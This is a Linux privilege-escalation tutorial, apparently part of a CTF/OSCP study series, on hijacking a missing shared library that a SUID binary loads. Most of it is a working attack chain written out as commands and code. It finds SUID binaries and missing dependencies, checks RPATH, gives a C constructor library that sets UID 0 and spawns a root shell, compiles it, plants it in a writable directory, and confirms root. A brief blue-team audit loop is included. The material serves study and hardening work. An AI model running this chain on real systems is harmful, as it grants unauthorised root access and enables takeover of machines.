# 17 — Shared Library Injection (Missing .so Hijack)

## Overview

This is a **different scenario** from the `LD_PRELOAD`/`LD_LIBRARY_PATH` environment-variable abuse already covered in `08-environment-variables.md`. There, the attack works by overriding libraries that already exist. Here, the binary is **already broken** — it's looking for a shared library that doesn't exist anywhere on the filesystem, and if you can place a file at the exact path it's searching, you get code execution the moment the binary runs.

```
Binary runs → tries to load libsomething.so → not found anywhere in search path → CRASH (normally)
If you create that missing file in a path the binary searches → binary loads YOUR code instead → executes as whatever user ran the binary
```

This is especially powerful against **SUID binaries** with a missing dependency, since your injected code then runs as root.

---

## Step 1 — Find SUID Binaries with Missing Libraries

```bash
find / -perm -4000 -type f 2>/dev/null
```
For each SUID binary found, check its dependencies:

```bash
ldd /usr/local/bin/suid_target
```
**Breakdown:**
- `ldd` = List Dynamic Dependencies — shows every shared library a binary needs and where it was found
- Look specifically for lines containing `not found`:

```
linux-vdso.so.1 (0x00007ffc...)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f...)
libcustom.so.1 => not found                          ← THIS is your target
/lib64/ld-linux-x86-64.so.2 (0x00007f...)
```

**Why important:** `libcustom.so.1 => not found` means the dynamic linker searched every directory in its library search path and found nothing. If you can write a malicious `libcustom.so.1` into ANY of those searched directories, the binary will load it on next execution.

---

## Step 2 — Determine Where the Linker Searches

The dynamic linker searches, in order:

1. Directories listed in the binary's `RPATH`/`RUNPATH` (embedded in the binary itself)
2. `LD_LIBRARY_PATH` environment variable (if set and not restricted — SUID binaries usually ignore this for security)
3. `/etc/ld.so.cache` (built from `/etc/ld.so.conf` and `/etc/ld.so.conf.d/*.conf`)
4. Default system paths: `/lib`, `/usr/lib`, etc.

```bash
# Check embedded RPATH/RUNPATH in the binary itself - THIS is the one worth targeting for SUID binaries
readelf -d /usr/local/bin/suid_target | grep -i "rpath\|runpath"
```
**Breakdown:**
- `readelf -d` = display the dynamic section of an ELF binary
- `RPATH`/`RUNPATH` = a custom search path compiled INTO the binary by the developer — often points to a non-standard directory like `/opt/app/lib` or even a relative path
- **Why this matters for SUID binaries specifically:** `LD_LIBRARY_PATH` is ignored by the dynamic linker for SUID/SGID executables (a kernel-level security measure), but `RPATH`/`RUNPATH` embedded directly in the binary is NOT ignored — this is your real way in

```bash
# Check the directory's write permissions
ls -la /opt/app/lib
```

---

## Step 3 — Craft the Malicious Library

Write a C file with a constructor function (runs automatically on load, before `main()` of the calling program even executes):

```c
// libcustom.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void hijack() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```
**Breakdown:**
- `__attribute__((constructor))` = GCC-specific attribute marking this function to run automatically as soon as the shared library is loaded into memory — no need to wait for any specific function to be called by the host program
- `setuid(0); setgid(0)` = escalate to root UID/GID (works because the host SUID binary is already running with root privileges at this point)
- `system("/bin/bash -p")` = spawn a privileged shell

### Compile with the Exact Expected Name

```bash
gcc -shared -fPIC -o libcustom.so.1 libcustom.c
```
**Breakdown:**
- The output filename **must exactly match** what `ldd` reported as missing (`libcustom.so.1` in this example) — the linker matches by exact filename (and SONAME inside the library, for stricter cases)
- `-shared -fPIC` = standard flags for producing a loadable shared object

### Place It in a Writable Search Path

```bash
cp libcustom.so.1 /opt/app/lib/libcustom.so.1
```

---

## Step 4 — Trigger Execution

```bash
/usr/local/bin/suid_target
```
**What happens:** The binary starts, the dynamic linker resolves its dependencies, finds `libcustom.so.1` in the writable `RPATH` directory, loads it, our constructor function fires immediately, escalates to root, spawns bash.

```bash
id
# uid=0(root) gid=0(root)
```

---

## Alternative: SONAME Mismatch Trick

Sometimes `ldd` shows a library as found, but with a version mismatch that can still be abused if the containing directory is writable and loaded earlier in the search order than the legitimate copy:

```bash
objdump -p libcustom.so.1 | grep SONAME
```
**Breakdown:**
- `objdump -p` = display the program headers of the object file
- `SONAME` = the internal "shared object name" the linker actually matches against, which may differ slightly from the on-disk filename — matching this exactly matters if you're trying to shadow an existing library rather than fill a genuinely missing one (that scenario is closer to the `LD_LIBRARY_PATH` technique in `08-environment-variables.md`; this file focuses specifically on the "not found" / missing dependency case)

---

## Why This Works (Conceptually)

- A missing shared-library dependency is usually an application packaging mistake — a leftover `RPATH` pointing to a directory that no longer has the library, or a dev/staging path that was never cleaned up for production
- The dynamic linker has no way to verify that a library it loads is "legitimate" — it just loads whatever matches the expected filename at the expected path
- Because `LD_LIBRARY_PATH` is correctly ignored for SUID binaries by the kernel, this embedded-`RPATH` variant is the one real way attackers have found to still inject code into privileged binaries that have this specific flaw

---

## Detection / Hardening Notes (Blue Team)

```bash
# Audit all SUID binaries for missing or RPATH-writable dependencies
for f in $(find / -perm -4000 -type f 2>/dev/null); do
  echo "=== $f ==="
  ldd "$f" 2>/dev/null | grep "not found"
done

# Never leave RPATH/RUNPATH pointing to a world-writable or group-writable directory
# Rebuild with proper RPATH set to a secure, root-only directory
```

---

## Practice

Less common than SUID/sudo/cron basics, but shows up on harder-rated CTF/OSCP-adjacent boxes that specifically test dependency/library enumeration. Always add `ldd` checks on every SUID binary you find as a standard follow-up step after the initial `find / -perm -4000` enumeration (ties into `01-suid-abuse.md`).

---

## Quick Checklist

```
[ ] find / -perm -4000 -type f 2>/dev/null           → find SUID binaries
[ ] ldd <binary> | grep "not found"                   → find missing library dependencies
[ ] readelf -d <binary> | grep -i "rpath\|runpath"    → find embedded search path (key for SUID)
[ ] ls -la <rpath directory>                          → check write access
[ ] write libcustom.c with __attribute__((constructor)) + setuid(0) + system("/bin/bash -p")
[ ] gcc -shared -fPIC -o <exact_missing_name> libcustom.c
[ ] cp <compiled lib> into writable RPATH directory
[ ] run the SUID binary                               → triggers load
[ ] id                                                 → confirm root
```
